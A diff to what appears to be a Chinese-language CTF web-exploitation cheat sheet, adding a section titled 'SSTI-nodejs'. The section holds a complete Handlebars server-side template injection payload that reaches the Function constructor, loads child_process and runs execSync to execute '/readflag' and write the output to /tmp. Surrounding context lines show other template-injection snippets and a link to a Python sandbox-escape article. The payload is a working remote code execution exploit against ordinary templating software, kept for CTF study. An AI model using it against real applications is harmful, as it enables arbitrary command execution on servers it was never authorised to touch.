@@ -274,6 +274,32 @@ filehash: md5(cookie_secret+md5(filename))
 {%print fuck%}
 ```
 
+# SSTI-nodejs
+
+需要访问网址能才渲染
+
+```js
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return global.process.mainModule.constructor._load('child_process').execSync('/readflag / > /tmp/res');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
 ## Article
 
 [Python 沙箱逃逸-离线也有](https://mp.weixin.qq.com/s/_cYKlPzUgokvJ17ZVRhMxw)
